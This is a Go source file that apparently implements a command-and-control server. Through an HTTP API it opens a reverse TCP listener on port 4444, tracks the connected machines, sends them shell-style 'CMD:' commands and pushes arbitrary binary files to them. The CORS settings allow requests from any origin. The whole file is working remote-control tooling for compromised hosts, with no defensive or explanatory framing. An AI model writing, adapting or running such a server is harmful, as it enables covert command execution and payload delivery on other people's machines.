package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"sync"
	"time"
)

var (
	isListening   bool
	listenerMutex sync.Mutex
	currentPort   int
	clients       = make(map[string]net.Conn)
	clientsMutex  sync.Mutex
)

func enableCORS(w *http.ResponseWriter, r *http.Request) {
	(*w).Header().Set("Access-Control-Allow-Origin", "*")
	(*w).Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
	(*w).Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization, *")

	if r.Method == "OPTIONS" {
		(*w).WriteHeader(http.StatusOK)
		return
	}
}

func main() {
	http.Handle("/", http.FileServer(http.Dir(".")))

	// Start listener endpoint
	http.HandleFunc("/start-listener", func(w http.ResponseWriter, r *http.Request) {
		enableCORS(&w, r)

		if r.Method == "OPTIONS" {
			return
		}

		listenerMutex.Lock()
		alreadyListening := isListening
		listenerMutex.Unlock()

		if alreadyListening {
			json.NewEncoder(w).Encode(map[string]string{
				"status": "⚠️ Listener already running on port 4444",
			})
			return
		}

		go startReverseTCPListener(4444)

		json.NewEncoder(w).Encode(map[string]string{
			"status": "✅ Listener started on port 4444 - waiting for connections...",
		})
	})

	// Get connected clients
	http.HandleFunc("/get-clients", func(w http.ResponseWriter, r *http.Request) {
		enableCORS(&w, r)

		clientsMutex.Lock()
		clientList := make([]string, 0, len(clients))
		for addr := range clients {
			clientList = append(clientList, addr)
		}
		clientsMutex.Unlock()

		json.NewEncoder(w).Encode(clientList)
	})

	// Send command to client
	http.HandleFunc("/send-command", func(w http.ResponseWriter, r *http.Request) {
		enableCORS(&w, r)

		if r.Method == "OPTIONS" {
			return
		}

		type CommandRequest struct {
			Client  string `json:"client"`
			Command string `json:"command"`
		}

		var cmdReq CommandRequest
		if err := json.NewDecoder(r.Body).Decode(&cmdReq); err != nil {
			http.Error(w, "Invalid JSON", http.StatusBadRequest)
			return
		}

		clientsMutex.Lock()
		conn, exists := clients[cmdReq.Client]
		clientsMutex.Unlock()

		if !exists {
			json.NewEncoder(w).Encode(map[string]string{
				"status": "❌ Client not connected",
			})
			return
		}

		// Send command with prefix
		commandMsg := "CMD:" + cmdReq.Command + "\n"
		_, err := conn.Write([]byte(commandMsg))
		if err != nil {
			json.NewEncoder(w).Encode(map[string]string{
				"status": "❌ Failed to send command: " + err.Error(),
			})
			return
		}

		json.NewEncoder(w).Encode(map[string]string{
			"status": "✅ Command sent to " + cmdReq.Client,
		})
	})

	// Send binary file to client
	http.HandleFunc("/send-binary", func(w http.ResponseWriter, r *http.Request) {
		enableCORS(&w, r)
		if r.Method == "OPTIONS" {
			return
		}

		// Parse multipart form
		if err := r.ParseMultipartForm(32 << 20); err != nil { // 32MB max
			http.Error(w, "Failed to parse form", http.StatusBadRequest)
			return
		}

		clientAddr := r.FormValue("client")
		file, _, err := r.FormFile("binaryFile")
		if err != nil {
			http.Error(w, "Failed to get file", http.StatusBadRequest)
			return
		}
		defer file.Close()

		clientsMutex.Lock()
		conn, exists := clients[clientAddr]
		clientsMutex.Unlock()

		if !exists {
			json.NewEncoder(w).Encode(map[string]string{
				"status": "❌ Client not connected",
			})
			return
		}

		// Read raw binary data
		binaryData, err := io.ReadAll(file)
		if err != nil {
			json.NewEncoder(w).Encode(map[string]string{
				"status": "❌ Failed to read binary file: " + err.Error(),
			})
			return
		}

		// Send raw binary data directly
		_, err = conn.Write(binaryData)
		if err != nil {
			json.NewEncoder(w).Encode(map[string]string{
				"status": "❌ Failed to send binary data: " + err.Error(),
			})
			return
		}

		json.NewEncoder(w).Encode(map[string]string{
			"status": fmt.Sprintf("✅ Binary file sent (%d bytes) to %s", len(binaryData), clientAddr),
		})
	})

	log.Println("Server running on :8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}

func startReverseTCPListener(port int) {
	listenerMutex.Lock()
	isListening = true
	currentPort = port
	listenerMutex.Unlock()

	defer func() {
		listenerMutex.Lock()
		isListening = false
		currentPort = 0
		listenerMutex.Unlock()
	}()

	address := fmt.Sprintf("0.0.0.0:%d", port)
	listener, err := net.Listen("tcp", address)
	if err != nil {
		log.Printf("Failed to start listener: %v", err)
		return
	}
	defer listener.Close()

	log.Printf("Reverse TCP listener started on port %d", port)

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("Accept error: %v", err)
			continue
		}

		clientAddr := conn.RemoteAddr().String()
		log.Printf("New reverse TCP connection from: %s", clientAddr)

		// Store the connection
		clientsMutex.Lock()
		clients[clientAddr] = conn
		clientsMutex.Unlock()

		// Handle client in background
		go handleClientConnection(conn, clientAddr)
	}
}

func handleClientConnection(conn net.Conn, clientAddr string) {
	defer func() {
		conn.Close()
		clientsMutex.Lock()
		delete(clients, clientAddr)
		clientsMutex.Unlock()
		log.Printf("Client disconnected: %s", clientAddr)
	}()

	// Keep connection alive and read responses
	buffer := make([]byte, 1024)
	for {
		// Set read timeout to check connection health
		conn.SetReadDeadline(time.Now().Add(30 * time.Second))

		n, err := conn.Read(buffer)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				// Timeout - connection still alive, continue
				continue
			}
			// Actual error - client disconnected
			break
		}

		// Client sent us data
		message := string(buffer[:n])
		log.Printf("Response from %s: %s", clientAddr, message)
	}
}
